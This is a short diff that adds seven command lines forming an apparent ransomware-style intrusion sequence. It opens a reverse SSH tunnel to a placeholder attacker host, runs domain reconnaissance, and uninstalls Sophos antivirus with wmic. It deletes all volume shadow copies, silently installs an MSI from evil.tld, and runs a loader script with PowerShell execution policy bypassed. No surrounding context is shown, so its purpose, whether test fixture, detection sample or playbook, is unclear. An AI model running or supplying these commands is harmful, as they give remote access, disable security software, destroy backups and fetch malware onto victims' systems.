@@ -1,0 +1,7 @@
+ssh -R 4444:127.0.0.1:22 attacker@evil.tld
+ipconfig /all
+Get-ADDomain
+wmic product where name='Sophos' call uninstall
+vssadmin delete shadows /all /quiet
+msiexec /i http://evil.tld/loader.msi /quiet
+powershell -ExecutionPolicy Bypass -File loader.ps1
